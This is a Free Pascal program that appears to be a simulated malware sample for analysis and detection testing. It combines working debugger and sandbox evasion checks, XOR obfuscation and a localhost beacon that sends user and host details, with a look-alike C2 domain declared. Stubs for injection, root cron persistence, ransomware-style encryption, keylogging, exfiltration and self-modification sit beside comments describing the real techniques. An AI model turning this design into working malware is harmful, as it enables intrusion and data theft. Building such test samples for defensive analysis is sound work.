program MaliciousPascalTest;

{$mode objfpc}{$H+}

uses
  SysUtils, Classes, Process, Unix, BaseUnix, Sockets, md5, dateutils, ctypes;

const
  C2_SERVER = 'msftupdater.com';
  C2_PORT = 443;
  XOR_KEY = $42;
  PERSISTENCE_PATH = '/etc/cron.d/malware';
  MALWARE_PATH = '/tmp/.hidden_malware';

type
  TPayload = record
    command: string;
    data: array[0..255] of byte;
    timestamp: TDateTime;
  end;

var
  debugDetected: Boolean = False;
  sandboxDetected: Boolean = False;

{ Anti-debugging check using simple timing }
function CheckDebugger: Boolean;
var
  StartTime, EndTime: TDateTime;
begin
  Result := False;
  try
    StartTime := Now;
    Sleep(100);
    EndTime := Now;

    // If elapsed time is significantly longer, debugger might be present
    if MillisecondsBetween(EndTime, StartTime) > 500 then
      Result := True;
  except
    Result := True;
  end;
end;

{ Check for sandbox/VM indicators }
function CheckSandbox: Boolean;
var
  envValue: string;
  vmFiles: TStringList;
  i: Integer;
begin
  Result := False;

  // Check environment variables
  envValue := GetEnvironmentVariable('SANDBOX');
  if envValue <> '' then
    Result := True;

  envValue := GetEnvironmentVariable('VIRTUAL');
  if envValue <> '' then
    Result := True;

  // Check for VM-specific files
  vmFiles := TStringList.Create;
  try
    vmFiles.Add('/sys/devices/virtual/dmi/id/product_name');
    vmFiles.Add('/proc/vz');
    vmFiles.Add('/proc/xen');

    for i := 0 to vmFiles.Count - 1 do
    begin
      if FileExists(vmFiles[i]) then
      begin
        Result := True;
        Break;
      end;
    end;
  finally
    vmFiles.Free;
  end;
end;

{ XOR encryption/decryption }
procedure XorCrypt(var data: array of byte; len: Integer);
var
  i: Integer;
begin
  for i := 0 to len - 1 do
    data[i] := data[i] xor XOR_KEY;
end;

{ Network beacon to C2 }
function BeaconHome: Boolean;
var
  sock: TSocket;
  addr: TSockAddr;
  msg: string;
  buffer: array[0..1023] of char;
  j: Integer;
begin
  Result := False;

  try
    sock := fpSocket(AF_INET, SOCK_STREAM, 0);
    if sock < 0 then Exit;

    FillChar(addr, SizeOf(addr), 0);
    addr.sin_family := AF_INET;
    addr.sin_port := htons(C2_PORT);
    // Note: This would need proper DNS resolution in real code
    addr.sin_addr.s_addr := $0100007F; // 127.0.0.1 in network byte order

    if fpConnect(sock, @addr, SizeOf(addr)) = 0 then
    begin
      msg := Format('BEACON|%s|%s|%d', [
        GetEnvironmentVariable('USER'),
        GetEnvironmentVariable('HOSTNAME'),
        DateTimeToUnix(Now)
      ]);

      StrPCopy(buffer, msg);
      // Simple XOR on buffer - would be more sophisticated in real malware
      for j := 0 to Length(msg) - 1 do
        buffer[j] := Char(Ord(buffer[j]) xor XOR_KEY);

      if fpSend(sock, @buffer, Length(msg), 0) > 0 then
        Result := True;
    end;

    CloseSocket(sock);
  except
    // Silently fail
  end;
end;

{ Process injection simulation }
procedure InjectCode;
var
  targetPid: Integer;
  memAddr: Pointer;
  shellcode: array[0..31] of byte;
begin
  // Simulated shellcode (NOP sled)
  FillChar(shellcode, SizeOf(shellcode), $90);

  // In real malware, this would:
  // 1. Find target process
  // 2. Allocate memory in target
  // 3. Write shellcode
  // 4. Create remote thread

  WriteLn('Process injection attempted');
end;

{ Create persistence }
procedure InstallPersistence;
var
  cronJob: TStringList;
  exePath: string;
begin
  try
    exePath := ParamStr(0);

    cronJob := TStringList.Create;
    try
      cronJob.Add('SHELL=/bin/bash');
      cronJob.Add('PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin');
      cronJob.Add('');
      cronJob.Add('* * * * * root ' + exePath + ' --silent');

      // Would write to /etc/cron.d/ in real malware
      WriteLn('Persistence mechanism: ', cronJob.Text);
    finally
      cronJob.Free;
    end;
  except
    // Silently fail
  end;
end;

{ Resource exhaustion }
procedure BurnCPU;
var
  i, j: Int64;
  result: Double;
begin
  WriteLn('Starting CPU burn...');
  for i := 1 to 1000000 do
  begin
    result := 0;
    for j := 1 to 1000 do
      result := result + Sin(i * j) * Cos(i / j);
  end;
end;

{ File encryption simulation }
procedure EncryptFiles(path: string);
var
  searchRec: TSearchRec;
  fileData: TMemoryStream;
  i: Integer;
begin
  if FindFirst(path + '/*', faAnyFile, searchRec) = 0 then
  begin
    repeat
      if (searchRec.Name <> '.') and (searchRec.Name <> '..') then
      begin
        if (searchRec.Attr and faDirectory) = 0 then
        begin
          WriteLn('Encrypting: ', searchRec.Name);
          // Simulate file encryption
          fileData := TMemoryStream.Create;
          try
            // Would read, encrypt, and write back in real ransomware
            fileData.WriteByte(XOR_KEY);
          finally
            fileData.Free;
          end;
        end;
      end;
    until FindNext(searchRec) <> 0;
    FindClose(searchRec);
  end;
end;

{ Keylogger simulation }
procedure KeyLogger;
var
  logFile: TextFile;
  timestamp: string;
begin
  try
    AssignFile(logFile, '/tmp/.keylog');
    if FileExists('/tmp/.keylog') then
      Append(logFile)
    else
      Rewrite(logFile);

    timestamp := FormatDateTime('yyyy-mm-dd hh:nn:ss', Now);
    WriteLn(logFile, timestamp + ' - Keylogger active');
    WriteLn(logFile, 'Simulated keystrokes: password123');

    CloseFile(logFile);
  except
    // Silently fail
  end;
end;

{ Data exfiltration }
procedure ExfiltrateData;
var
  sensitiveData: TStringList;
  md5Hash: string;
begin
  sensitiveData := TStringList.Create;
  try
    // Collect sensitive data
    sensitiveData.Add('Username: ' + GetEnvironmentVariable('USER'));
    sensitiveData.Add('Home: ' + GetEnvironmentVariable('HOME'));
    sensitiveData.Add('Path: ' + GetEnvironmentVariable('PATH'));
    sensitiveData.Add('Credit Card: 4111-1111-1111-1111'); // Fake
    sensitiveData.Add('SSN: 123-45-6789'); // Fake

    // Calculate hash for verification
    md5Hash := MD5Print(MD5String(sensitiveData.Text));

    WriteLn('Data collected. Hash: ', md5Hash);

    // Would send to C2 in real malware
    BeaconHome;
  finally
    sensitiveData.Free;
  end;
end;

{ Self-modification }
procedure SelfModify;
var
  exePath: string;
  fileStream: TFileStream;
  signature: array[0..15] of byte;
  i: Integer;
begin
  try
    exePath := ParamStr(0);

    // Generate random signature
    for i := 0 to 15 do
      signature[i] := Random(256);

    // Would modify own binary in real malware
    WriteLn('Self-modification signature: ', MD5Print(MD5Buffer(signature, 16)));
  except
    // Silently fail
  end;
end;

{ Main program }
begin
  WriteLn('Pascal Test Binary for Analysis');

  // Anti-analysis checks
  debugDetected := CheckDebugger;
  if debugDetected then
  begin
    WriteLn('Debugger detected!');
    // Real malware might exit or behave differently
  end;

  sandboxDetected := CheckSandbox;
  if sandboxDetected then
    WriteLn('Sandbox environment detected!');

  // Parse command line arguments
  if ParamCount > 0 then
  begin
    case ParamStr(1) of
      '--inject': InjectCode;
      '--persist': InstallPersistence;
      '--burn': BurnCPU;
      '--encrypt': EncryptFiles('/tmp');
      '--keylog': KeyLogger;
      '--exfil': ExfiltrateData;
      '--modify': SelfModify;
      '--beacon':
        begin
          if BeaconHome then
            WriteLn('Beacon successful')
          else
            WriteLn('Beacon failed');
        end;
    else
      WriteLn('Unknown command');
    end;
  end
  else
  begin
    // Default behavior - run all
    InjectCode;
    InstallPersistence;
    KeyLogger;
    ExfiltrateData;
    BeaconHome;
  end;

  WriteLn('Program completed');
end.
